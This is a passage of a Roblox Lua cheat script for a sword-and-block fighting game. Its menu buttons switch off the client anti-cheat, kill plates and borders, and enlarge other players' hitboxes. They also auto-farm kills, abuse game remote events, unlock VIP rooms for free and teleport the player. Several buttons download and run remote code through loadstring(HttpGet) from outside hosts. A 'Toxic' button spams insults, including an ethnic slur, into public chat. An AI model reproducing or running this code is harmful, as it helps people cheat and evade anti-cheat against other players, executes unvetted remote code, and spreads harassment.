			local args = {
				[1] = " - Darklingz Brocken Emo 2021",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
		end
	)


	nop2:NewButton(
		"Love Paragraph",
		function()
			local args = {
				[1] = "verything you say makes me so ahhh. The way you talk sounds so formal and I really love it. ",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = " I didn't believe in love at first sight until we started talking. You truly are someone different. You always encourage me and it makes me smile so genuinely.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "I'm sorry I'm so awkward around you you're just like so amazing and so precious please don't ever hurt yourself it's not worth it. Without you the world would be so bleak.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "I'm pretty sure you like drawing too, that makes me love you even more. There's like nothing bad about you.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "I don't get how you're so perfect. You're literally more perfect than the person who I thought was the most perfect person ever is",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "No one is as good as you, literally no one.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "Your sense of humour, your music taste, your personality, your sweet little compliments.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "Agh everything makes me so happy. You as a whole make me so happy. I love you so much even if you'll never know how I truly feel.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "If you think you don't deserve love and help thats so stupid you literally deserve every last thing that anyone gives you you're literally better than everyone and everything",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "You make me feel like I'm the most special person in the world, but at the same time you probably feel horrible and it breaks my heart.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "I only want the best for you and for you to be happy no matter what it takes. ",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "I'll do anything to make you happy, anything, like seriously please just be happy and know you're loved you're the best person to ever be alive and I don't want you to die ever.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "I really love you I'm not just saying this. Please tell me when something's wrong I'm here to support you in all your life choices.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "I'm here when you need someone to cry to. I'm not gonna judge you. Real friends don't judge people",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "You're absolutely wonderful even if you don't think so AND YOU'RE NOT UGLY YOU'RE SO CUTE.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "Looks don't matter it's what's in the heart and I can tell you're a really sweet person who puts their friends above others.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "You probably think your friends deserve to be happy and you don't, but honestly you deserve happiness the most.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "I'm not sad I'm not struggling with anything. You need to realise that it's not only your friends that matter.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "You do too. You matter the most to me, out of anyone.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = "You're happiness comes first. If you're not happy then you're not in a position to make your friends happy. Please be happy always. ",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
			wait (2)

			local args = {
				[1] = " I wanna see you smile. I wanna know that you're really happy because you seem to be going through a hard time even though you don't show it and I really want to help.",
				[2] = "All"
			}

			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
		end
	)


	nop3:NewButton(
		"Armor Troll",
		function()
			local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			local character = game.Players.LocalPlayer.Character 
			character.HumanoidRootPart.CFrame = CFrame.new(-11,265,61)
			wait(0.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
			wait(0.1)
			character.Chest:Destroy()
			wait(0.1)
			character.Arm1:Destroy()
			wait(0.1)
			character.Arm2:Destroy()
			wait(0.1)
			character.Leg1:Destroy()
			wait(0.1)
			character.Leg2:Destroy()
		end
	)






	nyes:NewButton(
		"Mega VIP",
		function()
			local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
			local location = CFrame.new(-0,264,69)
			local humanoid = game.Players.LocalPlayer.Character.Humanoid
			humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
			wait(0.1)
			pl.CFrame = location
		end
	)



	nyes:NewButton(
		"Lobby",
		function()
			local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
			local location = CFrame.new(0,268,6)
			local humanoid = game.Players.LocalPlayer.Character.Humanoid
			humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
			wait(0.1)
			pl.CFrame = location
		end
	)


	nop2:NewButton(
		"AntiCheat",
		function()
			game:GetService("Players").LocalPlayer.PlayerGui.Extra.Local:Destroy()
			game:GetService("Players").LocalPlayer.PlayerGui.Extra.Local:Destroy()
		end
	)


	nop2:NewButton(
		"SwordFight Bot",
		function()
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/EpikBirdo/ok-and/main/bigchungusporn'),true))()
		end
	)

	nop2:NewButton(
		"Speed Potion",
		function()
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 26
		end
	)


	nop2:NewButton(
		"Coin Pickup",
		function()
			local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

			local stuff = workspace:getDescendants()
			for i=1,#stuff do
				if stuff[i].Name == "Coin" and stuff[i].Parent.Name == "Coins" then
					repeat
						wait()
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = stuff[i].CFrame
						game.Players.LocalPlayer.Character.Axe.RemoteEvent:FireServer(stuff[i])
					until stuff[i].Name ~= "Block" or not game.Players.LocalPlayer.Character:findFirstChild("Axe")
				end
			end

			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
		end
	)

	nop2:NewButton(
		"Hitbox",
		function()
			loadstring(game:HttpGet(('https://pastebinp.com/raw/ZZt25qnX'),true))()
		end
	)






	nop:NewButton(
		"Circle Sword",
		function()
			Speed = 0
			Spin = 0
			TornadoSpin = 0
			CircleEffect = 0
			StartingAngle = 0 -- Not degrees
			RemoveMesh = false
			Rotation = 0
			Flip = true
			OffsetX = 0
			OffsetY = 10
			OffsetZ = 1
			AntiLag = false
--[[
AntiLag if set to true will stop lag for poor devices
If your device is not poor and can handle it, you do
not need to touch this option. 
Note: If you are one of these people,
you will have to have an exception
for slower tool animation processing.
]]
			local Speed_2 = Speed/math.random(3.875,4.125)
			local function backpack()
				for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
					if v:IsA("Tool") then
						v.Parent = game.Players.LocalPlayer.Backpack.Sword
					end
				end
			end
			local function character()
				for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v:IsA("Tool") then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end
			game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
			if Flip then
				game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Grip = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Grip * CFrame.Angles(math.rad(180),0,0)
				game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Grip = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Grip + Vector3.new(0+OffsetX/math.pi,0+OffsetY/math.pi,0+OffsetZ/math.pi)
			else
				game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Grip = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Grip * CFrame.Angles(math.rad(0+Rotation),0,StartingAngle)
				game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Grip = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Grip + Vector3.new(0+OffsetX/math.pi,0+OffsetY/math.pi,0+OffsetZ/math.pi)
			end
			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Backpack
			if RemoveMesh then
				for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v:IsA("Tool") then
						v.Handle.Mesh:Remove()
					else
					end
				end
			end
			repeat
				for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v:IsA("Tool") then
						v.Grip = v.Grip * CFrame.Angles(math.rad(Spin*Speed_2),0+TornadoSpin,CircleEffect/16)
					end
				end
				character()
				game:GetService("RunService").RenderStepped:wait()
				backpack()
				if AntiLag then
					game:GetService("RunService").RenderStepped:wait()
				else
				end
			until game.Players.LocalPlayer.Character.Humanoid.Health == 0
		end
	)







	yes:Seperator()

	yesnt:NewSlider(
		"Player Speed",
		16,
		25,
		function(value)
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
		end
	)

	yesnt:NewSlider(
		"Player Jump Power",
		50,
		80,
		function(value)
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
		end
	)

























	nyes:NewButton(
		"Mid",
		function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 185, 0)
		end
	)


	game.RunService.Stepped:Connect(
		function()
			local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			posbtn:Update("Character Pos: " .. math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z))

			local cframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			cfbtn:Update(
				"Character CFrame: " .. math.round(cframe.X) .. ", " .. math.round(cframe.Y) .. ", " .. math.round(cframe.Z)
			)
		end
	)
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer

	local function GetClosest()
		local Character = LocalPlayer.Character
		local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
		if not (Character or HumanoidRootPart) then
			return
		end

		local TargetDistance = math.huge
		local Target

		for i, v in ipairs(Players:GetPlayers()) do
			if
				v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and
				v.Character:FindFirstChild("Sword") or
				v.Backpack:FindFirstChild("Sword")
			then
				local TargetHRP = v.Character.HumanoidRootPart
				local mag = (HumanoidRootPart.Position - TargetHRP.Position).magnitude
				if mag < TargetDistance then
					TargetDistance = mag
					Target = v
				end
			end
		end

		return Target
	end

	nop:NewToggle(
		"Farm Wins",
		function(bool)
			_G.Enabled = bool
			game.RunService.Stepped:Connect(
				function()
					pcall(
						function()
							if not _G.Enabled then
								return
							end
							if GetClosest() == nil then
								for i, v in pairs(game:GetService("Workspace").GameStorage.Coins:GetChildren()) do
									wait(0.1)
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
									wait(0.1)
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 190, 0)
								end
							end
							if GetClosest().Character.HumanoidRootPart.Position.Y <= 130 then
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 185, 0)
							end
							if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword") then
								game.Players.LocalPlayer.Backpack:FindFirstChild("Sword").Parent =
									game.Players.LocalPlayer.Character
							end
							if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
								game.Players.LocalPlayer.Character:FindFirstChild("Sword"):Activate()
							end
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
								GetClosest().Character.HumanoidRootPart.CFrame - Vector3.new(0, 5.3, 0) +
								GetClosest().Character.HumanoidRootPart.CFrame.lookVector * -4.005
						end
					)
				end
			)
		end
	)

end)


--Free Vips
section2:addButton("Free Vips", function()
	AdriPart = game.workspace.Lobby["Mega VIP Room"].Teleport.Enter["Teleporter B"]
	AdriPart:Clone().Parent = game.workspace.Lobby["Mega VIP Room"].Teleport.Enter
	game.workspace.Lobby["Mega VIP Room"].Teleport.Enter["Teleporter B"]:Destroy()
	wait()
	game.workspace.Lobby["Mega VIP Room"].Teleport.Enter["Teleporter B"].Touched:Connect(function(hit)
		local player = game.Players:GetPlayerFromCharacter(hit.Parent)
		player.Character.HumanoidRootPart.CFrame = CFrame.new(-1.06104672, 264, 72.2138901)
	end)

	AdriPart2 = game:GetService("Workspace").Lobby["VIP Room"].Teleport.Enter["Teleporter A"]
	AdriPart2:Clone().Parent = game:GetService("Workspace").Lobby["VIP Room"].Teleport.Enter
	game:GetService("Workspace").Lobby["VIP Room"].Teleport.Enter["Teleporter A"]:Destroy()
	wait()
	game:GetService("Workspace").Lobby["VIP Room"].Teleport.Enter["Teleporter A"].Touched:Connect(function(hit)
		local player = game.Players:GetPlayerFromCharacter(hit.Parent)
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0.324219227, 264, -69.9828949)
	end)  
	venyx:Notify("Enabled", "FreeVipsRooms")
end)


--No Collide Blocks
section2:addButton("NoCollideBlocks", function()
	local Why = game:GetService("Players").LocalPlayer
	local Char = Why.Character
	local backpack = Why.Backpack

	backpack.Block.Parent =  Why.Character
	Char.Block.Left:Destroy()
	Char.Block.Parent = Why.Backpack
end)

--ArmorInvisibleBody
section2:addButton("ArmorInvisibleBody", function()
	if game:GetService("Players").LocalPlayer.Character:FindFirstChild("kakaz")==nil then
		if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Role")==nil then
			Alol = Instance.new("SelectionBox",game:GetService("Players").LocalPlayer.Character)
			Alol.Name = "kakaz"
			for i,v in next, game:GetService("Workspace").Regen.Purchases:FindFirstChild("MVPurchases"):GetDescendants() do 
				if v:IsA("Part") and v.Name =="Button" and v:FindFirstChild("TouchInterest") then
					firetouchinterest(game:GetService("Players").LocalPlayer.Character.Head,v, 0)
					firetouchinterest(game:GetService("Players").LocalPlayer.Character.Head,v, 1)
				end
			end

			for i,v in next, game:GetService("Workspace").Regen.Purchases:FindFirstChild("MVPurchases"):GetDescendants() do 
				if v:IsA("Part") and v.Name =="SWHelmet" then
					firetouchinterest(game:GetService("Players").LocalPlayer.Character.Head,v, 0)
					firetouchinterest(game:GetService("Players").LocalPlayer.Character.Head,v, 1)
				end
			end
			--wait(0.6)
			game.Players.LocalPlayer.Character:WaitForChild("Leg2")
			game:GetService("Players").LocalPlayer.Character:FindFirstChild("Chest"):Destroy()
			game:GetService("Players").LocalPlayer.Character:FindFirstChild("Arm1"):Destroy()
			game:GetService("Players").LocalPlayer.Character:FindFirstChild("Arm2"):Destroy()
			game:GetService("Players").LocalPlayer.Character:FindFirstChild("Leg1"):Destroy()
			game:GetService("Players").LocalPlayer.Character:FindFirstChild("Leg2"):Destroy()
			wait()
			game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Arm"):Destroy()
			game:GetService("Players").LocalPlayer.Character:FindFirstChild("SWHelmet").Handle:Destroy()
		else
			game.StarterGui:SetCore("SendNotification", {
				Title    = " Not work?"; 
				Text     = "."; 
				Duration = 0.8;
			})
		end
	else
		game.StarterGui:SetCore("SendNotification", {
			Title    = " Not work?"; 
			Text     = "."; 
			Duration = 0.8;
		})
	end
end)


--AntiRoundFinishKill
section2:addButton("AntiRoundFinishKill", function()
	if game:GetService("Workspace").Terrain:FindFirstChild("Seat")==nil then
		ct    = {}
		game.StarterGui:SetCore("SendNotification", {Title = "Enabled"; Text = ""; Duration = 3;})    
		sound = Instance.new("Seat", game:GetService("Workspace").Terrain)
		table.insert(ct,game:GetService("RunService").Stepped:Connect(function()
			if game:GetService("Workspace").timer.Value < 1 or game:GetService("Workspace").plrsLeft.Value < 2 then
				game.StarterGui:SetCore("SendNotification", {
					Title    = "round finished"; 
					Text     = ""; 
					Duration = 3;
				})         
				for i,v in pairs(ct) do v:Disconnect() end
				sound:Destroy()
				wait(2.3)
				game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8, 268, 6)
				for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v:IsA("Tool") then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end
		end))
	else
		game.StarterGui:SetCore("SendNotification", {Title = "Really Executed"; Text = ""; Duration = 3;})    
	end
end)


--Bypass
section2:addButton("Bypass", function()
	if game:GetService("Players").LocalPlayer.PlayerGui.Extra:FindFirstChild("Local") then
		local plr       = game:GetService("Players").LocalPlayer
		local workspace = game:GetService("Workspace")

		plr.PlayerGui:WaitForChild("Extra"):WaitForChild("Local").Parent = game:GetService("Workspace")
		plr.PlayerGui:WaitForChild("Extra"):WaitForChild("Local").Parent = game:GetService("Workspace")
		plr.PlayerGui:WaitForChild("Extra"):WaitForChild("MobileFix").Parent = game:GetService("Workspace")
		plr.PlayerGui:WaitForChild("Extra"):WaitForChild("XboxFix").Parent = game:GetService("Workspace")
		wait()
		workspace:FindFirstChild("Local"):Destroy()
		workspace:FindFirstChild("Local"):Destroy()
		workspace:FindFirstChild("MobileFix"):Destroy()
		workspace:FindFirstChild("XboxFix"):Destroy()
		game.workspace.Borders.InvisibleBorder:Destroy()
		game.workspace.Lobby.KillPlates:Destroy()
		venyx:Notify("Bypassed", "Bypassed: true")

		plr.CharacterAdded:Connect(function()
			plr.PlayerGui:WaitForChild("Extra"):WaitForChild("Local").Parent = game:GetService("Workspace")
			plr.PlayerGui:WaitForChild("Extra"):WaitForChild("Local").Parent = game:GetService("Workspace")
			plr.PlayerGui:WaitForChild("Extra"):WaitForChild("MobileFix").Parent = game:GetService("Workspace")
			plr.PlayerGui:WaitForChild("Extra"):WaitForChild("XboxFix").Parent = game:GetService("Workspace")
			wait()
			workspace:FindFirstChild("Local"):Destroy()
			workspace:FindFirstChild("Local"):Destroy()
			workspace:FindFirstChild("MobileFix"):Destroy()
			workspace:FindFirstChild("XboxFix"):Destroy()
		end)
	else
		venyx:Notify("Really", "Bypassed")           
	end
end)


--SECTİON 3


--Undermıne Aura
_G.UWU = false
section3:addToggle("Undermine Aura", nil, function(value)
	if value == true then
		_G.NoBugs = false
		game.StarterGui:SetCore("SendNotification", {
			Title = "\n Undermine Enabled"; 
			Text     = ""; 
			Duration = 0.5;
		}) 
		_G.UWU = true
		while _G.UWU == true do
			wait()
			if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Axe") then
				function onTouched(part)       
					local h = part
					if h.Name == "Block" then
						game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Axe").RemoteEvent:FireServer(h)  
					end
				end
				Partz              = Instance.new("Part")
				Partz.Parent       = workspace
				Partz.Transparency = 1
				Partz.CanCollide   = false
				Partz.Massless     = true
				Partz.Position     = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,9,0)
				Partz.Size         = Vector3.new(31,31,31)

				local light         = Instance.new("SelectionBox")
				light.Adornee       = Partz
				light.LineThickness = 0.05
				light.Color3        = Color3.fromRGB(0, 255, 0)
				light.Parent        = Partz
				light.Name          = "SelectBox"

				local bruh = Partz.Touched:connect(onTouched)

				wait()
				bruh:Disconnect()
				Partz:Destroy()
				wait()
			end
		end
	end
	if value == false then
		_G.UWU    = false
		_G.NoBugs = true
		game.StarterGui:SetCore("SendNotification", {
			Title = "\n Undermine Disabled"; 
			Text     = ""; 
			Duration = 0.5;
		}) 
	end
end)




--Undermıne Aura Key
_G.Undermineh = true
section3:addKeybind("Undermine Aura", Enum.KeyCode.Insert, function()
	if _G.NoBugs == true then
		if _G.Undermineh == true then
			if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Axe") then
				function onTouched(part)       
					local h = part
					if h.Name == "Block" then
						game:GetService("Players").LocalPlayer.Backpack.Axe.RemoteEvent:FireServer(h)  
					end
				end
				Partz              = Instance.new("Part")
				Partz.Parent       = workspace
				Partz.Transparency = 1
				Partz.CanCollide   = false
				Partz.Massless     = true
				Partz.Position     = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,9,0)
				Partz.Size         = Vector3.new(31,31,31)

				local light         = Instance.new("SelectionBox")
				light.Adornee       = Partz
				light.LineThickness = 0.05
				light.Color3        = Color3.fromRGB(0, 255, 0)
				light.Parent        = Partz
				light.Name          = "SelectBox"

				local bruh = Partz.Touched:connect(onTouched)

				wait()
				bruh:Disconnect()
				Partz:Destroy()
			end
		end
	end
end)

sektion:addSlider("Walkspeed", 16, 16, 100, function(value)
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (value)
end)

sektion:addSlider("JumpPower", 50, 50, 100, function(value)
	game.Players.LocalPlayer.Character.Humanoid.JumpPower = (value)
end)

sektion:addSlider("Hitbox", 2, 2, 30, function(value)
	for i,v in pairs(game.Players:GetChildren()) do
		if v.Name ~= game.Players.LocalPlayer.Name then
			v.Character.HumanoidRootPart.Transparency = 0.5
			v.Character.HumanoidRootPart.Size         = Vector3.new((value),(value),(value))
			v.Character.HumanoidRootPart.Material     = "Plastic"
			v.Character.HumanoidRootPart.BrickColor   = BrickColor.new("Really blue")
			v.Character.HumanoidRootPart.CanCollide   = false
		end
	end
end)


others:addButton("HealthNotification", function()
	local z = game.Players.LocalPlayer.Character.Humanoid


	game.StarterGui:SetCore("SendNotification", {
		Title    = "YourHealth is: "..z.Health; 
		Text     = "MaxHealth: "..z.MaxHealth; 
		Duration = 3;
	})  
end)

others:addButton("EnableChristmas", function()
	local clickdetector = game:GetService("Workspace").EnableChristmas.ClickDetector

	fireclickdetector(clickdetector)
end)

others:addButton("ToggleNight", function()
	local clickdetector = game:GetService("Workspace").ToggleNight.ClickDetector

	fireclickdetector(clickdetector)
end)

others:addButton("Equiptools", function()
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = game.Players.LocalPlayer.Character
		end
	end
end)

others:addButton("NoRole", function()
	for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA("BoolValue") then
			v:Destroy()
		end
	end
end)

others:addButton("AntiVoidKill", function()
	workspace.FallenPartsDestroyHeight = -math.huge
end)

others:addButton("Toxic", function()
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ucube","All")
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("fukara","All")
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("kürt","All")
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ez","All")
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("totali 0","All")
end)

colors:addKeybind("Toggle Keybind", Enum.KeyCode.E, function()
	venyx:toggle()
end, function()
end)
--
sektion2:addButton("Lobby", function()
	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2, 268, 1)
end)

sektion2:addButton("Vip", function()
	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.324219227, 264, -69.9828949)
end)

sektion2:addButton("Mega vip", function()
	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1.06104672, 264, 72.2138901)
end)

sektion2:addButton("Middle", function()
	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2, 171, -9)
end)

sektin:addButton("Circle Attack", function()
	for i, v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = game:GetService("Players").LocalPlayer.Character
		end
	end
	for i, v in pairs(game:GetService "Players".LocalPlayer.Character:GetChildren()) do
		if v:isA("Tool") then
			v.GripPos = Vector3.new(7, 0, 3)
		end
	end
end)

sektin:addButton("Magic Sword", function()
	for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
		if v:isA("Tool") then
			v.Handle.Mesh:Destroy()
			lplayer.Character.Humanoid:UnequipTools()
		end
	end
end)

sektin:addButton("FakeAxe", function()
	local Players       = game:GetService("Players")
	local localPlayer   = Players.LocalPlayer
	local backpack      = localPlayer:WaitForChild("Backpack")
	local tool          = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.CanBeDropped   = true
	tool.Parent         = backpack
	tool.Name           = "FakeAxe"
	tool.Equipped:Connect(function(mouse)
		mouse.Button1Down:Connect(function()
			if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Block") then
				if mouse.Target and mouse.Target.Parent then
					local Adrix = {
						[1] = mouse.Target
					}

					game:GetService("Players").LocalPlayer.Backpack.Axe.RemoteEvent:FireServer(unpack(Adrix))  
				end
			end
		end)
	end)
end)

sektin:addButton("FakeBlock", function()
	local Players       = game:GetService("Players")
	local localPlayer   = Players.LocalPlayer
	local backpack      = localPlayer:WaitForChild("Backpack")
	local tool          = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.CanBeDropped   = true
	tool.Parent         = backpack
	tool.Name           = "FakeBlock"
	tool.Equipped:Connect(function(mouse)
		mouse.Button1Down:Connect(function()
			if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Block") then
				if mouse.Target and mouse.Target.Parent then
					game:GetService("Players").LocalPlayer.Backpack.Block.RemoteEvent:FireServer(mouse.Target,Enum.NormalId.Right)
					game:GetService("Players").LocalPlayer.Backpack.Block.RemoteEvent:FireServer(mouse.Target,Enum.NormalId.Left)
					game:GetService("Players").LocalPlayer.Backpack.Block.RemoteEvent:FireServer(mouse.Target,Enum.NormalId.Back)
					game:GetService("Players").LocalPlayer.Backpack.Block.RemoteEvent:FireServer(mouse.Target,Enum.NormalId.Front)
				end
			end
		end)
	end)
end)

section2:addButton("Infinite Yield", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
end)

build:addButton("Undermine", function()
	if _G.NoBugs == true then
		function onTouched(part)       
			local h = part
			if h.Name == "Block" then
				game:GetService("Players").LocalPlayer.Backpack.Axe.RemoteEvent:FireServer(h)  
			end
		end
		Partz              = Instance.new("Part")
		Partz.Parent       = workspace
		Partz.Transparency = 1
		Partz.CanCollide   = false
		Partz.Massless     = true
		Partz.Position     = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,9,0)
		Partz.Size         = Vector3.new(15,20,15)

		local light         = Instance.new("SelectionBox")
		light.Adornee       = Partz
		light.LineThickness = 0.05
		light.Color3        = Color3.fromRGB(0, 255, 0)
		light.Parent        = Partz
		light.Name          = "SelectBox"

		local bruh = Partz.Touched:connect(onTouched)

		wait()
		bruh:Disconnect()
		Partz:Destroy()
	end
end)

Sky:addButton("Pink Sky", function()
	function sandbox(var,func)
		local env = getfenv(func)
		local newenv = setmetatable({},{
			__index = function(self,k)
				if k=="script" then
					return var
				else
					return env[k]
				end
			end,
		})
		setfenv(func,newenv)
		return func
	end
	cors = {}
	mas = Instance.new("Model",game:GetService("Lighting"))
	Sky0 = Instance.new("Sky")
	Sky0.Parent = mas
	Sky0.CelestialBodiesShown = false
	Sky0.SkyboxBk = "rbxassetid://271042516"
	Sky0.SkyboxDn = "rbxassetid://271077243"
	Sky0.SkyboxFt = "rbxassetid://271042556"
	Sky0.SkyboxLf = "rbxassetid://271042310"
	Sky0.SkyboxRt = "rbxassetid://271042467"
	Sky0.SkyboxUp = "rbxassetid://271077958"
	for i,v in pairs(mas:GetChildren()) do
		v.Parent = game:GetService("Lighting")
		pcall(function() v:MakeJoints() end)
	end
	mas:Destroy()
	for i,v in pairs(cors) do
		spawn(function()
			pcall(v)
		end)
	end
end)

Sky:addButton("Purple Sky", function()
	function sandbox(var,func)
		local env = getfenv(func)
		local newenv = setmetatable({},{
			__index = function(self,k)
				if k=="script" then
					return var
				else
					return env[k]
				end
			end,
		})
		setfenv(func,newenv)
		return func
	end
	cors = {}
	mas = Instance.new("Model",game:GetService("Lighting"))
	Sky0 = Instance.new("Sky")
	Sky0.Parent = mas
	Sky0.CelestialBodiesShown = false
	Sky0.SkyboxBk = "rbxassetid://570557514"
	Sky0.SkyboxDn = "rbxassetid://570557775"
	Sky0.SkyboxFt = "rbxassetid://570557559"
	Sky0.SkyboxLf = "rbxassetid://570557620"
